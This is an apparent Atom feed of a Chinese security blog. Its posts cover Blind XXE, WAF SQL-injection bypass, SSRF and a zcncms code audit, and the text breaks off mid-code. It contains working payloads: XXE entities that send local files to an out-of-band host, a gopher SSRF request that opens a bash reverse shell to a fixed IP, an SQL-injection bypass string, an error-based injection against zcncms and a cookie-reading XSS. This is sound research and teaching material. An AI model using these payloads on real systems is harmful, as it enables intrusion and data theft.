<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>小黑屋</title>
  <subtitle>一群专注安全的小伙们</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://das.scusec.org/"/>
  <updated>2016-08-24T09:50:36.358Z</updated>
  <id>http://das.scusec.org/</id>
  
  <author>
    <name>das</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>当提起Blind XXE时候会想到什么</title>
    <link href="http://das.scusec.org/2016/08/24/ksss/"/>
    <id>http://das.scusec.org/2016/08/24/ksss/</id>
    <published>2016-08-24T09:50:36.358Z</published>
    <updated>2016-08-24T09:50:36.358Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://dassec.b0.upaiyun.com/ksss/xml-2016-08-24.jpg" alt="enter description here"></p>
<p>XXE（XML实体注入漏洞）顾名思义，漏洞的关键点在于服务器对外部实体的解析。外部实体中可以请求他域资源，也许在包括我之内的很多人在漏洞利用时会习惯的把XXE问题转换成SSRF的问题。<br><a id="more"></a></p>
<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>前几天别人问我一个有趣的问题：<strong>Blind XXE和普通XXE本质区别是什么。</strong> 仔细想了想，我答不上来，由于类似于cloudeye的使用DNS泛析和URL请求记录是可以查看命令执行结果的，大家通常不会在意漏洞点程序是否预设了回显或者可以使用报错得到回显。所以找了一些资料，记录一下上面问题的答案和也顺便记录一下XXE漏洞形成的原因。</p>
<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>首先要搞清楚的是XML外部实体的概念。一般容易误以为外部是自己定义的意思，事实上外部实体是指实体的参数内容不是当前XML定义的而是从其他资源引入的，用<strong>SYSTEM</strong>和<strong>PUBLIC</strong>来申明，也就是我们常在XXE payload里面看到的样子。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="doctype">&lt;!DOCTYPE ANY [</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY hello SYSTEM "http://%xx.xxx.yourcloudeye.xxx/%xx"&gt;</span><br><span class="line"></span><br><span class="line">]&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>如果在外界可控的 web代码和xml的交互点 可以插入我们定义的xml实体并被服务器解析，这样就造成了一个XXE漏洞（这句话写了很多遍还是觉得难读通顺，用SQLi类推一下就比较好理解了）。以php为例搭了一个测试环境。</p>
<p><img src="http://www.mauu.me/wp-content/uploads/2016/08/QQ%E6%88%AA%E5%9B%BE20160824092818.png" alt="enter description here"></p>
<p>首先浏览器是可以解析XML的，当然，是没有权限解析外部实体的（不然url链接没人敢点了）。开始在lamp下搭发现的www用户解析外部实体权限也不够，于是在wamp环境给apache sa权限测试。下面是php使用simplexml_load_file解析xml文件代码。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (file_exists(<span class="string">'b.xml'</span>)) &#123;</span><br><span class="line">    <span class="variable">$xml</span> = simplexml_load_file(<span class="string">'b.xml'</span>);</span><br><span class="line">	var_dump(<span class="variable">$xml</span>);</span><br><span class="line"><span class="comment">/*    echo($xml-&gt;title);</span><br><span class="line">    var_dump($xml);*/</span></span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">'Failed to open b.xml.'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="preprocessor">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><img src="http://www.mauu.me/wp-content/uploads/2016/08/QQ%E6%88%AA%E5%9B%BE20160824094116.png" alt="enter description here"></p>
<p>xxetest.php把b.xml的内容解析后输出一个SimpleXMLElement对象，供其他函数使用xml中各个节点的值。我们可以在平台上看到解析外部实体发送的请求。剩下的利用就比较直观了，在请求资源时使用<a href="http://端口探测或带上内网攻击向量；file://或者php://filter等读取文件；gopher://发送复杂请求等等。" target="_blank" rel="external">http://端口探测或带上内网攻击向量；file://或者php://filter等读取文件；gopher://发送复杂请求等等。</a></p>
<p><img src="http://www.mauu.me/wp-content/uploads/2016/08/QQ%E6%88%AA%E5%9B%BE20160824094812.png" alt="enter description here"></p>
<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>回到Blind XXE的问题，仔细看b.xml可以发现，在开始定义了hello这个实体后，节点中引入了一个 <strong>&amp;hello；</strong>。如果请求的资源存在，则可以在节点中看到hello的值，这就是有返回的XXE雏形。对b.xml稍作修改，使用file协议读取本地文件，结果如下图。</p>
<p><img src="http://www.mauu.me/wp-content/uploads/2016/08/QQ%E6%88%AA%E5%9B%BE20160824100258.png" alt="enter description here"></p>
<p>所以如果xml文件没有在节点中使用这个实体，或者节点中使用了&amp;hello；而可执行文件没有把值在response中返回的情况就属于Blind XXE。<br>如果进行端口探测等操作可以直接参考SSRF利用时间差来完成，如果要接收回显的话，也可以用实体嵌套来完成。如果xml解析器不支持嵌套定义有可以把gethello内容写在外部xml中再引用进来有时候可以绕过。<br>也有把hello的值作为参数传给自己服务器上的php中然后保存成文件的，原理差不多，但是没有DNS解析平台简洁直观。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="doctype">&lt;!DOCTYPE root [  </span><br><span class="line">&lt;!ENTITY % hello "file:///c:/1.txt"&gt;  </span><br><span class="line">&lt;!ENTITY % gethello "&lt;!ENTITY % param222 SYSTEM'http://xxx.yourcloudeye.xxx/%hello;'&gt;"&gt;  </span><br><span class="line">%gethello;  </span><br><span class="line">]&gt;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>对XXE的总结就差不多到这里了，如果说Blind XXE和XXE有什么本质区别的话，大概是Blind会让有些人说的：“不就是发包看返回的”的扫描器比较头疼吧。<br>之前SSRF文章的坑也准备填上了，2准备把归纳的一些gopher构造方法，一些内网ip限制绕过策略，以及打造自己的SSRF自动化探测脚本三个方面总结一下。<br>最近发现自己关于程序底层和程序优化相关的比较弱，想学习一下，有好的资料请推荐给我嘛~~</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://dassec.b0.upaiyun.com/ksss/xml-2016-08-24.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;/p&gt;
&lt;p&gt;XXE（XML实体注入漏洞）顾名思义，漏洞的关键点在于服务器对外部实体的解析。外部实体中可以请求他域资源，也许在包括我之内的很多人在漏洞利用时会习惯的把XXE问题转换成SSRF的问题。&lt;br&gt;
    
    </summary>
    
    
      <category term="ksss,blind XXE,实体注入" scheme="http://das.scusec.org/tags/ksss-blind-XXE-%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>浅谈WAF下的SQL注入绕过</title>
    <link href="http://das.scusec.org/2016/08/24/waf-sql-bypass/"/>
    <id>http://das.scusec.org/2016/08/24/waf-sql-bypass/</id>
    <published>2016-08-24T09:49:05.100Z</published>
    <updated>2016-08-23T03:01:30.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>几个月前在一个SRC的一个夺旗赛看了一下，题目里遇到了他们用自己的云waf保护起来的靶机，不禁心里为出题人鼓掌。直接对靶机奉上绕过策略当然有点蠢萌，不过作为探索研究决定继续往下看了看，当时运气不错，一顿测试后还真的找到了一个sql injection的bypass方法过了那题，觉得这个简单的绕过策略他们应该能抓到，等补了再写博客。<a id="more"></a></p>
<p>结果。。。这两天聊到云waf想起这件事来。去主站看了一下，发现和上次测试区别是防御规则加上了web客户端指纹，发现恶意以后直接长时间屏蔽掉来自这个web客户端的请求。然而上次用的方法并没有被补上，本来想把payload作为绕过实例的，现在只好略过这个具体方法写思路了。正巧前段时间看到锁师兄在ali峰会上讲的waf防御的非主流技术，那记录一下测试思路和友情吹一波锁师兄。</p>
<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>WAF大体上可以划分到硬件防护、软件防护和云防护。其实有waf测试经验的话可以比较明显的返回包和从拦截表现区分出保护waf是哪一类，硬防一般直接把你的请求包丢弃，软防和云防一般会有自己独特的拦截页和拦截头。<br>大概一年前测过师兄公司系统外署的绿盟ips绕过。只能说硬防的规则有种不可描述的感觉，像不是从http层做的流量清洗，最终在注入语句后构造一定的尾巴再以及对间隔符的替换（当时这个ips发现对各种间隔符非常敏感）绕过了防御。盲测规则感觉是件挺耗心力的事。小尾巴大概长/**/‘1’=1–这样，改一个字符前面的绕过都会功亏一篑。。。不过核心思想还是查看引入哪些字符、替换同类函数以及做各种编码等哪些操作能不失语义地引发waf判断的变化。</p>
<p><img src="http://www.mauu.me/wp-content/uploads/2016/08/QQ%E6%88%AA%E5%9B%BE20160818201051-1.png" alt="测试截图"></p>
<h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>举个例子，从下面的图我们可以看到保护思路，一般的网站在接受云保护后是不会把进入流量限定到只为云waf所在位置，所以有一个比较简单粗暴的方法就是寻找到主机的真实IP，绕过云waf直接去访问网站主机。</p>
<p><img src="http://www.mauu.me/wp-content/uploads/2016/08/QQ%E6%88%AA%E5%9B%BE20160818203051.png" alt="结构示意图"></p>
<p>不过正面突破也是有方法的，下面讲一个某waf注入绕过思路。</p>
<p>waf对sql注入的防御，做法将检测到的恶意流量进行过滤。那么问题的核心就在于恶意判断，由于攻击者可以在攻击向量中加入大量的冗余数据进行混淆，因此直接取原始流量判断效率低下。所以通常做法是先进行格式化、去冗余等。</p>
<p>那么假如一个无效字符没有被作为冗余数据被处理掉而进入waf判断器，则很有可能让攻击向量被判断器认为无害。（这里用锟来假设存在这样一个特殊字符，请求 “union锟%20select锟” 时可能被waf判断为无害的，因为 “union锟” 在判断器眼里和 “onion” 什么的差不多，然而sql执行时因为 “锟” 是一个无效的字符而被删除了），可以参考从容的 %23%0A+Emoji表情符 绕过方法。</p>
<p>同理，如果有效字符如果被认为是冗余字符而处理掉后进行判断，然而在sql执行器中却是起作用的，这样很可能让攻击向量逃过判断器审查，如紫苏叶的绕过方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id =1 as &#39;--+&#39; union select 1,2,3%23</span><br></pre></td></tr></table></figure></p>
<p>当然这些具体的绕过策略现在都已经修复了，但是只要这种存在缺陷的机制还在的话，这种漏洞仍会出现。</p>
<p>直接看实例吧，用主站演示，随便输一个语句被拦截了</p>
<p>（这个图还是隐藏了）</p>
<p>可以对比一下下面两张图，我们发现通过各种方式提交的一些冗余数据让waf规则变弱了，让本来无法通过的攻击向量生效了，当然，即使这样攻击向量也不能随意构造，必须使用一些混淆。稍微一点不注意还是会触发拦截，所以绕过测试需要很大的耐心和一点点运气。</p>
<p>前几天就这个方法和锁哥聊了一下，锁哥说union select这个地方绕过确实有办法，但查询如果使用information.schema这张表，会使waf变得更敏感，一些小细节都会触发规则。</p>
<p>这就意味着如果不是一个通用cms的话，我们将无法获得数据库结构，只能获取猜到的表名和字段名的内容。虽然from之后的混淆方法很少导致绕过困难，总归有办法的~</p>
<p>因为绕过方法还没修就隐去了一些具体细节，先记录思路，等修了再放测试图。</p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2016-0192841" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2016-0192841</a><br><a href="http://www.wooyun.org/bugs/wooyun-2015-0159517" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2015-0159517</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00&quot;&gt;&lt;a href=&quot;#0x00&quot; class=&quot;headerlink&quot; title=&quot;0x00&quot;&gt;&lt;/a&gt;0x00&lt;/h2&gt;&lt;p&gt;几个月前在一个SRC的一个夺旗赛看了一下，题目里遇到了他们用自己的云waf保护起来的靶机，不禁心里为出题人鼓掌。直接对靶机奉上绕过策略当然有点蠢萌，不过作为探索研究决定继续往下看了看，当时运气不错，一顿测试后还真的找到了一个sql injection的bypass方法过了那题，觉得这个简单的绕过策略他们应该能抓到，等补了再写博客。
    
    </summary>
    
    
      <category term="ksss" scheme="http://das.scusec.org/tags/ksss/"/>
    
      <category term="waf" scheme="http://das.scusec.org/tags/waf/"/>
    
      <category term="注入" scheme="http://das.scusec.org/tags/%E6%B3%A8%E5%85%A5/"/>
    
      <category term="绕过" scheme="http://das.scusec.org/tags/%E7%BB%95%E8%BF%87/"/>
    
  </entry>
  
  <entry>
    <title>从入门到精通SSRF（1）</title>
    <link href="http://das.scusec.org/2016/08/24/easy-to-SSRF-1/"/>
    <id>http://das.scusec.org/2016/08/24/easy-to-SSRF-1/</id>
    <published>2016-08-24T09:49:05.092Z</published>
    <updated>2016-08-23T02:55:14.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>很早就看到别人对这个漏洞的研究，但是完全没有预想到它能有这么大的能量。最初觉得请求他域资源如果限制不严格，可能导致安全边界穿越。然而边界穿越导致内网信息泄露并不是重点，最近的redis未授权、struts2命令执行等等存放在安全位置而忽略了安全配置的机器则把这个漏洞的能量放大了很多倍。<br><a id="more"></a></p>
<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>先在php上写了一个ssrf简单环境。</p>
<p><img src="http://www.mauu.me/wp-content/uploads/2016/07/QQ%E6%88%AA%E5%9B%BE20160727151540.png" alt="读取远程图片"></p>
<p><img src="http://www.mauu.me/wp-content/uploads/2016/07/QQ%E6%88%AA%E5%9B%BE20160727151520.png" alt="使用其他协议"></p>
<p>对比上面两张图，本来这个功能在头像功能也许大家都见过，可以直接填入图片的url地址设定它为自己的头像。然而如果对填入的url地址没有处理，就可能导致本机etc/passed或者内网文件被这个功能直接读取出来。<br>在开启其他脑洞，进行内网端口探测以后，假设内网存在 struts2命令执行 这种可以把exp通过get参数简单传入的漏洞 ，利用从这个ssrf点传入攻击代码反弹一个shell。。。那么这把钥匙则可以直接打开内网的大门。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;?php &#10;if (isset($_GET[&#39;url&#39;]))  &#123;  &#10;$content = file_get_contents($_GET[&#39;url&#39;]);  &#10;$filename =&#39;./images/&#39;.rand().&#39;img1.jpg&#39;;  &#10;file_put_contents($filename, $content);  &#10;$img = &#34;&#60;img src=\&#34;&#34;.$filename.&#34;\&#34;/&#62;&#34;;  &#10;&#125;  &#10;echo $img;  &#10;?&#62;</span><br></pre></td></tr></table></figure>
<p>这个是简单测试代码，从代码上看，除了file_get_content()还有fsockopen()、curl_exec()等等资源获取的函数都可能存在这个漏洞。从黑盒来看，用户控制点作为资源地址传到函数中进行资源请求还是比较明显的，甚至有些vpn产品把这个当成一个正常的功能来使人员在外界可以访问到内网的系统。</p>
<p><img src="http://www.mauu.me/wp-content/uploads/2016/07/QQ%E6%88%AA%E5%9B%BE20160727151400-1024x674.png" alt="做映射的vpn设备"></p>
<p><img src="http://www.mauu.me/wp-content/uploads/2016/07/QQ%E6%88%AA%E5%9B%BE20160727151428-1024x433.png" alt="ssrf请求其他资源"></p>
<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>zzx说，能够对外发送网络请求的点都有可能存在ssrf漏洞。</p>
<p>因此针对应用二次挖掘的时候，在discuz、weblogic、sql连接器、xml执行器等等位置都可能存在这个漏洞。存在漏洞点对协议的支持也和是否能利用有很大关系，比如http get/put;webdav put;file;ftp/smtp/pop2;dict等等。<br>是否能够回显同样也是利用的重要因素，比如上面代码可以直接获取结果的完全回显，或者是只会返回成功失败的布尔回显以及甚至无回显。前段时间看到百度对自家ssrf的漏洞危险等级就是用回显程度来定义的。<br>如果漏洞存在点支持gopher协议可以直接用来进行文件操作getshell（参考gopher在xxe中的使用）。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:80/_POST /exp.php HTTP/1.1%0d%0aHost: 127.0.0.1%0d%0aUser-Agent: curl/7.43.0%0d%0aAccept: */*%0d%0aContent-Length: 49%0d%0aContent-Type: application/x-www-form-urlencoded%0d%0a%0d%0ae=bash -i &#62;%2526 /dev/tcp/172.19.23.228/2333 0&#62;%25261null</span><br></pre></td></tr></table></figure></p>
<p>所以简单来说，这个漏洞本身在很多地方都不被定义为漏洞。这个漏洞相当于一个起手式，比如一个布尔回显不支持gopher等协议的ssrf点，如果没有后招，则只能做一个内网拓扑，杀伤力很小。如果配合打出组合技则能打出意想不到的巨大杀伤，比如内网恰巧有一台未授权的redis。</p>
<h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>在参考链接中给出一些我觉得这个漏洞利用比较经典的例子，更多的巧妙使用协议、巧妙组合其他利用就不再贴图了，抛砖引玉，有兴趣的少年可以进一步找出更多有趣的利用，脑洞有多大，漏洞能量就有多大。<br>最近的cve vBulletin rec中ssrf的利用就非常的经典。</p>
<p>参考链接<br><a href="http://drops.wooyun.org/papers/8261" target="_blank" rel="external">http://drops.wooyun.org/papers/8261</a><br><a href="http://drops.wooyun.org/web/7550" target="_blank" rel="external">http://drops.wooyun.org/web/7550</a><br><a href="http://www.wooyun.org/bugs/wooyun-2010-0213982" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2010-0213982</a><br><a href="http://www.wooyun.org/bugs/wooyun-2010-0214429" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2010-0214429</a><br><a href="http://www.freebuf.com/articles/web/20407.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/20407.html</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00&quot;&gt;&lt;a href=&quot;#0x00&quot; class=&quot;headerlink&quot; title=&quot;0x00&quot;&gt;&lt;/a&gt;0x00&lt;/h2&gt;&lt;p&gt;很早就看到别人对这个漏洞的研究，但是完全没有预想到它能有这么大的能量。最初觉得请求他域资源如果限制不严格，可能导致安全边界穿越。然而边界穿越导致内网信息泄露并不是重点，最近的redis未授权、struts2命令执行等等存放在安全位置而忽略了安全配置的机器则把这个漏洞的能量放大了很多倍。&lt;br&gt;
    
    </summary>
    
    
      <category term="SSRF" scheme="http://das.scusec.org/tags/SSRF/"/>
    
      <category term="gopher" scheme="http://das.scusec.org/tags/gopher/"/>
    
      <category term="ksss" scheme="http://das.scusec.org/tags/ksss/"/>
    
  </entry>
  
  <entry>
    <title>代码审计——zcncms几处漏洞合集(二)</title>
    <link href="http://das.scusec.org/2016/08/23/code-audit-of-zcncms2/"/>
    <id>http://das.scusec.org/2016/08/23/code-audit-of-zcncms2/</id>
    <published>2016-08-22T16:00:00.000Z</published>
    <updated>2016-08-23T02:42:22.000Z</updated>
    
    <content type="html"><![CDATA[<p>接上一篇 <a href="http://wps2015.org/2016/08/05/code%20audit%20of%20zcncms/" target="_blank" rel="external">代码审计——zcncms后台SQL注入(一)</a>， 继续挖掘出zcncms的几处漏洞.<a id="more"></a></p>
<h4 id="后台SQL注入"><a href="#后台SQL注入" class="headerlink" title="后台SQL注入"></a>后台SQL注入</h4><p>继上一篇参数$parentid未正确处理后，在/module/products/admincontroller/products_photo.php中，<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>(<span class="variable">$a</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">'list'</span>:<span class="keyword">default</span>:<span class="comment">//list</span></span><br><span class="line">		<span class="comment">//列表</span></span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$productid</span>)) &#123;</span><br><span class="line">			<span class="variable">$where</span> = <span class="string">' 1 = 1 '</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="variable">$where</span> = <span class="string">" productid = '"</span>.<span class="variable">$productid</span>.<span class="string">"' "</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="variable">$pageListNum</span>=<span class="number">12</span>;<span class="comment">//每页显示</span></span><br><span class="line">		<span class="variable">$totalPage</span>=<span class="number">0</span>;<span class="comment">//总页数</span></span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line"><span class="keyword">case</span> <span class="string">'edit'</span>:<span class="comment">//</span></span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$submit</span>))&#123;</span><br><span class="line">			<span class="variable">$info</span> = <span class="keyword">array</span>();</span><br><span class="line">			<span class="variable">$time</span> = time();</span><br><span class="line">			<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$id</span>))&#123;</span><br><span class="line">				<span class="variable">$id</span> = intval(<span class="variable">$id</span>);</span><br><span class="line">				<span class="keyword">if</span>(<span class="variable">$id</span> &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">					errorinfo(<span class="string">'变量错误'</span>,<span class="string">''</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="variable">$infoold</span> = <span class="variable">$products_photo</span>-&gt;GetInfo(<span class="string">''</span>,<span class="string">' id = '</span>.<span class="variable">$id</span>);				</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="variable">$productinfo</span> = <span class="variable">$products</span>-&gt;GetInfo(<span class="string">''</span>,<span class="string">' id = '</span>.<span class="variable">$productid</span>);</span><br><span class="line">			<span class="comment">//20120719</span></span><br><span class="line">			checkClassPower(<span class="string">'products'</span>,<span class="variable">$productinfo</span>[<span class="string">'classid'</span>]);</span><br></pre></td></tr></table></figure></p>
<p>当 $a的值为’list’时，<code>$where = &quot; productid = &#39;&quot;.$productid.&quot;&#39; &quot;</code>, $procuctid被单引号保护起来，参数引进是经过addslashes操作的，所以这里是安全的。但是当$a == ‘edit’时，<code>$products-&gt;GetInfo(&#39;&#39;,&#39; id = &#39;.$productid)</code>，$productid被直接拼接到where语句中且没有单引号保护，导致SQL注入。构造payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8088/code_audit/zcncms/admin/?c=products_photo&#38;a=edit&#38;id=7&#10;POST:&#10;submit=&#38;productid=12=@`\\\&#39;`  and 1=(updatexml(1,concat(0x5e24,(select user()),0x5e24),1));#@`\\\&#39;`</span><br></pre></td></tr></table></figure></p>
<p><img src="https://img.alicdn.com/imgextra/i1/792076116/TB2xsvmuXXXXXcTXpXXXXXXXXXX_!!792076116.png" alt=""></p>
<h4 id="反射型xss"><a href="#反射型xss" class="headerlink" title="反射型xss"></a>反射型xss</h4><p>在后台登陆文件 /include/admincontroller/login.php中，进行登陆是否成功后，设置模板文件为’login.tpl.php’.<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">header(<span class="string">"location:./"</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">//echo 1;</span></span><br><span class="line"><span class="variable">$loginerror</span> = <span class="string">'用户名密码错误，请重新登陆.'</span>;</span><br><span class="line"><span class="variable">$templatefile</span> = <span class="string">'login.tpl.php'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="variable">$templatefile</span> = <span class="string">'login.tpl.php'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>跟踪到/admin/templates/default/login.tpl.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span><br><span class="line">&lt;title&gt;</span><br><span class="line"><span class="preprocessor">&lt;?php</span> <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$topTitle</span>)) <span class="keyword">echo</span> <span class="variable">$topTitle</span>.<span class="string">'-'</span>;<span class="preprocessor">?&gt;</span></span><br><span class="line"><span class="preprocessor">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$sys</span>[<span class="string">'indextitle'</span>]; <span class="preprocessor">?&gt;</span>-<span class="preprocessor">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$pagetitle</span>;<span class="preprocessor">?&gt;</span>&lt;/title&gt;</span><br><span class="line">&lt;meta name=<span class="string">"keywords"</span> content=<span class="string">"&lt;?php echo $sys['webkeywords']; ?&gt;"</span>&gt;</span><br><span class="line">&lt;meta name=<span class="string">"description"</span> content=<span class="string">"&lt;?php echo $sys['webdescription']; ?&gt;"</span>&gt;</span><br></pre></td></tr></table></figure></p>
<p>在<code>&lt;title&gt;</code>标签中要echo三个变量，其中会检查$topTitle是否为空，我们再控制器文件login.php中并未找到$topTitle的定义或初始化，由于之前参数输入特性，可以进行变量覆盖。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8088/code_audit/zcncms/admin/?c=login&#38;topTitle=&#60;/title&#62;&#60;script&#62;alert(document.cookie)&#60;/script&#62;</span><br></pre></td></tr></table></figure>
<p><img src="https://img.alicdn.com/imgextra/i2/792076116/TB2ufnWuXXXXXbmXXXXXXXXXXXX_!!792076116.png" alt=""></p>
<h4 id="后台getshell"><a href="#后台getshell" class="headerlink" title="后台getshell"></a>后台getshell</h4><p>在文件/include/admincontroller/sys.php中<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pagetitle</span> = <span class="string">'基本信息'</span>;</span><br><span class="line"><span class="variable">$pagepower</span> = <span class="string">'sys'</span>;</span><br><span class="line"><span class="comment">//基本部分</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">'checkpower.inc.php'</span>);</span><br><span class="line"><span class="comment">//功能部分</span></span><br><span class="line"><span class="keyword">include_once</span>(WEB_INC.<span class="string">'file.class.php'</span>);</span><br><span class="line"><span class="keyword">include_once</span>(WEB_INC.<span class="string">'string.class.php'</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$submit</span>))&#123;</span><br><span class="line">	<span class="variable">$FS</span> = <span class="keyword">new</span> files();</span><br><span class="line">	<span class="variable">$STR</span> = <span class="keyword">new</span> C_STRING();</span><br><span class="line">	<span class="variable">$info</span> = <span class="keyword">array</span>(</span><br><span class="line">	<span class="string">'isclose'</span> =&gt; <span class="variable">$isclose</span>,</span><br><span class="line">	<span class="string">'closeinfo'</span> =&gt; <span class="variable">$closeinfo</span>,</span><br><span class="line">	<span class="string">'webtitle'</span> =&gt; <span class="variable">$webtitle</span>,</span><br><span class="line">	<span class="string">'indextitle'</span> =&gt; <span class="variable">$indextitle</span>,</span><br><span class="line">	<span class="string">'webkeywords'</span> =&gt; <span class="variable">$webkeywords</span>,</span><br><span class="line">	<span class="string">'webdescription'</span> =&gt; <span class="variable">$webdescription</span>,</span><br><span class="line">	<span class="string">'webcopyright'</span> =&gt; <span class="variable">$webcopyright</span>,</span><br><span class="line">	<span class="string">'webbeian'</span> =&gt; <span class="variable">$webbeian</span>,</span><br><span class="line">	<span class="string">'systemplates'</span> =&gt; <span class="variable">$systemplates</span>,</span><br><span class="line">	<span class="string">'linkurlmode'</span> =&gt; <span class="variable">$linkurlmode</span>,</span><br><span class="line">	);</span><br><span 